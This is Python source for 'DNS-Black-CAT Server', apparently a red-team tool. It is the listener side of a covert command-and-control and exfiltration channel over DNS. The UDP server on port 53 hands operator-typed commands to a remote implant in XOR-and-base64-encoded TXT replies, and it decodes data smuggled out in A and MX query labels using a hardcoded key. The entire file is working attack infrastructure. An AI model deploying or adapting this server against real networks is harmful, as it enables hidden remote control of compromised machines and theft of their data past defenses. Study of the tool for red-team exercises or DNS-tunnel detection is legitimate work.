#!/usr/bin/python

import base64
from time import sleep
from dnslib import DNSRecord, RR, QTYPE, A, MX, TXT
from socketserver import BaseRequestHandler, UDPServer
import base64
from itertools import cycle
import argparse
import pyfiglet 


banner = pyfiglet.figlet_format(" DNS-Black-CAT Server ")
author = "[+] by: 0xsp.com  @zux0x3a"

print(banner)
print(author)

parser = argparse.ArgumentParser()
parser.add_argument("-d","--domain",action="store",required=1,help="domain name to use ")
parser.add_argument("-a","--ip",action="store",required=1,help="an IP address to use , it should be A record for domain name")
parser.add_argument("-i","--interface",action="store",required=1,help="interface IP address to listen on ")
args = parser.parse_args()


IP_ADDRESS  = args.ip
DOMAIN_NAME = args.domain
INTERFACE   = args.interface

def xor_crypto_de(data):
    key  = '0xsp.com' #same as client encryption key for decryption 
    data = base64.b64decode(data)
    xored = ''.join(chr(x ^ ord(y)) for x,y in zip(data, cycle(key)))     
    return xored

def xor_crypto_enc(data):
    key = "0xsp.com"
    xored = ''.join(chr(ord(x)^ord(y)) for x,y in zip(data,cycle(key)))
    return base64.encodestring(xored.encode('utf-8')).decode('utf-8').replace('\n', '').strip()

class Exfiltrator(BaseRequestHandler, object):
    def __init__(self, *args):
        self.q_processors = {
            1: self._A,      # A record
            12: self._MX,    # PTR record
            15: self._MX,    # MX record
            28: self._AAAA,  # AAAA record
            16: self._TXT    # TXT record
            }
        super(Exfiltrator, self).__init__(*args)
    def _AAAA(self, name):
        input("PRESS ENTER")
        return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)
    
    def _TXT(self, name):
        dr = name.label[0]
        ut = dr.decode("UTF-8")
        
        if ut == "live":
         
            cmds = input('CMD:');           
            with open("temp.txt","w") as text_file:
                   print(cmds,file=text_file)
                   text_file.close
            cmdsn = xor_crypto_enc(cmds);
            return RR(name, QTYPE.TXT, rdata=TXT(cmdsn), ttl=0)
        elif ut == "test":
             
             with open("temp.txt","r") as f:
                   cmd = f.read()
                   f.close
                   print(cmd) 
             return RR(name,QTYPE.TXT, rdata=TXT(xor_crypto_enc(cmd)),ttl=0)
             
    def _A(self, name):
        if name.label[0] == "data":
            print(base64.b64decode(rstrip(name.label[1]))),
        else:
            print(name)

        return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)

    def _MX(self, name):

         encryptedData = name.label[0]
         re_d = xor_crypto_de(encryptedData)
         print(re_d)
         return RR(name,QTYPE.MX,rdata=MX(DOMAIN_NAME),ttl=0)
         
    def handle(self):
  
        request = DNSRecord.parse(self.request[0])
        socket = self.request[1]
        reply = request.reply()
        answer = self.q_processors[reply.q.qtype](reply.q.qname)
        reply.add_answer(answer)
        socket.sendto(reply.pack(), self.client_address)
        
if __name__ == '__main__':
    HOST, PORT = args.interface , 53
    server = UDPServer((HOST, PORT), Exfiltrator)
    server.serve_forever()
    
